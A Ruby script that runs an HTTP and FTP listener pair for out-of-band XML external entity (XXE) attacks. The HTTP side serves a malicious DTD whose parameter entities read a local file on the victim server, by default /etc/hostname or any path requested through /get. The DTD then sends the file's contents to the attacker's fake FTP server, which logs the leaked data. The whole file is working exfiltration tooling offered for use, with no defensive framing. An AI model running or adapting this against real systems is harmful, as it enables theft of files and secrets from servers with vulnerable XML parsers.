#!/usr/bin/env ruby
require 'socket'
require 'optparse'

class XXEHandler

  @log, @http_port, @ftp_port, @listen_ip, @timeout = nil
  @verbose = false

  def initialize(options)
    @http_port  = options[:http_port]
    @ftp_port   = options[:ftp_port]
    @listen_ip  = options[:listen_ip]
    @timeout    = options[:timeout]
    @verbose    = options[:verbose]
    @file       = "/etc/hostname"

    startHttp
    startFtp

    puts "\nEnter q or press Ctrl + C to quit.\n\n"
    loop do
      exit if gets.chomp == 'q'
    end
  end

  def payload(ip, port)
    <<-PAYLOAD
      <!ENTITY % file SYSTEM "file://#{@file}">
      <!ENTITY % int "<!ENTITY &#37; send SYSTEM 'ftp://#{ip}:#{port}/%file;'>">
    PAYLOAD
  end

  def log(message, display = false)
    if true == @verbose or true == display
      puts message
    end
    @log.puts message
  end

  def startHttp
    puts "Starting HTTP handler on #{@listen_ip} port #{@http_port}"

    Thread.new do
      Socket.tcp_server_loop(@listen_ip, @http_port) do |socket, client|
        Thread.new do
          begin
            remote_ip = client.ip_address
            @log = File.open("xxe-http-#{remote_ip}.log", "a")
            log "New HTTP connection from #{remote_ip}"

            loop do
              req = socket.gets
              break if req.nil?
              log req
              if req.start_with? "GET /get"
                @file = req.scan(/GET \/get(.*) HTTP/).last.last
                payload = payload(@listen_ip, @ftp_port)
                socket.puts "HTTP/1.1 200 OK\r\nContent-length: #{payload.length}\r\n\r\n#{payload}"
                break
              elsif req.start_with? "GET"
                payload = payload(@listen_ip, @ftp_port)
                socket.puts "HTTP/1.1 200 OK\r\nContent-length: #{payload.length}\r\n\r\n#{payload}"
                break
              end
            end
          ensure
            log "Closing HTTP connection"
            socket.close
          end
        end
      end
    end
  end

  def startFtp
    puts "Starting FTP handler on #{@listen_ip} port #{@ftp_port}"

    Thread.new do
      Socket.tcp_server_loop(@listen_ip, @ftp_port) do |socket, client|
        Thread.new do
          begin
            remote_ip = client.ip_address

            @log = File.open("xxe-ftp-#{remote_ip}.log", "a")
            log "New FTP connection from #{remote_ip}", true

            socket.puts "220 xxe-ftp-handler"
            loop do
              IO.select([socket], nil, nil, @timeout) or fail "FTP connection timeout"
              req = socket.gets
              break if req.nil?

              log req

              if req.upcase.start_with? "USER"
                socket.print "331 Please specify password.\r\n"
              elsif req.upcase.start_with? "PASS"
                socket.print "200 OK\r\n"
              elsif req.upcase.start_with? "LIST"
                socket.print "drwxrwxrwx 1 owner group 1337 #{Time.new.strftime('%b %d %H:%M')}\r\n"
                socket.print "150 Accepted data connection\r\n"
                socket.print "226 Transfer completed!\r\n"
              elsif req.upcase.start_with? "PORT"
                socket.print "200 PORT command ok\r\n"
              elsif req.upcase.start_with? "EPSV"
                socket.print "229 ok\r\n"
              elsif req.upcase.start_with? "EPRT"
                socket.print "227 ok\r\n"
              elsif req.upcase.start_with? "SYST"
                socket.print "215 UNIX\r\n"
              elsif req.upcase.start_with? "RETR"
                log(">> #{@file}\n" + req[5...-1], true)
              elsif req.upcase.start_with? "CWD"
                log(">> #{@file}\n" + req[4...-1], true)
                socket.print "230 OK\r\n"
              elsif req.upcase.start_with? "QUIT" or
                    req.upcase.start_with? "CLOSE"
                socket.print "221 Goodbye\r\n"
                socket.close
                break
              else
                socket.print "230 OK\r\n"
              end
            end
          rescue Exception => e
            log e.message
          ensure
            log "Closing FTP connection"
            socket.close
          end
        end
      end
    end
  end
end

class ServerOptParser
  def self.parse(args)
    options = {}
    options[:http_port] = 8080
    options[:ftp_port]  = 2121
    options[:listen_ip] = Socket.ip_address_list[1].ip_address
    options[:timeout]  = 3

    parser = OptionParser.new do |opts|
      opts.banner = "usage: #{File.basename($0)} [options]"
      opts.on("-v", "--verbose", "Run verbosely") do |val|
        options[:verbose] = val
      end
      opts.on("-p", "--port [PORT]", Integer, "HTTP port number") do |val|
        if val.nil? or val < 1 or val > 65535
          raise "HTTP port number must be between 1-65535"
        else
          options[:http_port] = val
        end
      end
      opts.on("-f", "--ftp-port [PORT]", Integer, "FTP port number") do |val|
        if val.nil? or val < 1 or val > 65535
          raise "FTP port number must be between 1-65535"
        else
          options[:ftp_port] = val
        end
      end
      opts.on("-l", "--listen [IP]", String, "IP address to listen on") do |val|
        options[:listen_ip] = val
      end
      opts.on("-t", "--timeout [TIMEOUT]", Integer, "TIMEOUT socket timeout") do |val|
        options[:timeout] = val
      end
    end
    parser.parse!
    options
  end
end

begin
  options = ServerOptParser.parse(ARGV)
  server  = XXEHandler.new(options)

rescue SystemExit, Interrupt
  puts "Exiting ..."
rescue Exception => e
  puts e
end
